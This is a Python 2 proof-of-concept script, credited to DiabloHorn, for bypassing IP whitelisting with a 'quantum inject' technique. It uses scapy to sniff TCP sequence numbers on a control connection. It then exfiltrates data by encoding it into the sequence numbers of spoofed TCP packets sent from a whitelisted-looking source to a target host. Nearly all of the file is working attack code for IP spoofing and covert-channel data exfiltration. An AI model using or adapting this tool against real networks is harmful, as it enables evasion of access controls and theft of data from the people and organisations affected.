# DiabloHorn - QIBA_connectionhelper_poc
# Bypassing IP whitelisting using quantum inject
import time
from threading import Thread
from Queue import Queue, Empty

from scapy.all import *


class ControlConnection:
    def __init__(self, host,dport):
        self.host = host
        self.dport = dport
        self.snifferstarted = False

    def setup_cc(self):
        self.q = Queue()
        sniffert = Thread(target = self.__sniffer, args = (self.q,self.host))
        sniffert.daemon = True
        sniffert.start()
        self.snifferstarted = True

    def __sniffer(self, q, targetip,sniface='eth0'):
        sniff(iface=sniface,store=0,prn=lambda x : q.put(x),filter="ip and host {}".format(targetip))

    def connect(self):
        if self.snifferstarted:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((self.host, self.dport))

    def keepalive(self,data='exfil'):
        self.s.sendall(data)

    def leaknums(self):
        try:
            pkt = self.q.get(timeout=1)
            if pkt:
                tcpdata = pkt.getlayer(TCP)
                #synack received
                if tcpdata.flags == 16:
                    return (tcpdata.seq, tcpdata.ack, tcpdata.sport)
        except Empty:
            return None

    def getdata(self):
        self.s.settimeout(5)
        return self.s.recv(100)

    def close(self):
        self.s.close()

class ExfilConnection:
    def __init__(self, wip, ccip, wip_dport):
        self.wip = wip
        self.ccip = ccip

    def encode_data(self, data):
        padsize = 3 - (len(data) % 3)
        paddata = data
        encdata = list()
        if padsize != 3:
            paddata = paddata + (' ' * padsize)

        for i in range(0,len(paddata),3):
            datasum = ((ord(paddata[i]) + ord(paddata[i+1]) + ord(paddata[i+2])) % 0xff)
            encdata.append((paddata[i:i+3] + chr(datasum)))
        return encdata

    def senddata(self, data, port=19000):
        import struct
        datalen = len(data)
        myport = port
        exfildata = self.encode_data(data)
        for i in exfildata:
            print "Exfildata::::::: %s" % i
            print "Exfildata enc::::::: %s" % i.encode('hex')
            print "Exfildata int::::::: %d" % int(i.encode('hex'),16)
            self.leakdata(int(i.encode('hex'),16),myport)
            myport = myport + 1
            time.sleep(1)
        self.leakdata(int("STOP".encode('hex'),16),myport)

    def leakdata(self, leakednum, leakedport, wip_dport=8080):
        pkt = IP(src=self.ccip,dst=self.wip) / TCP(dport=wip_dport,sport=leakedport,seq=leakednum)
        send(pkt)
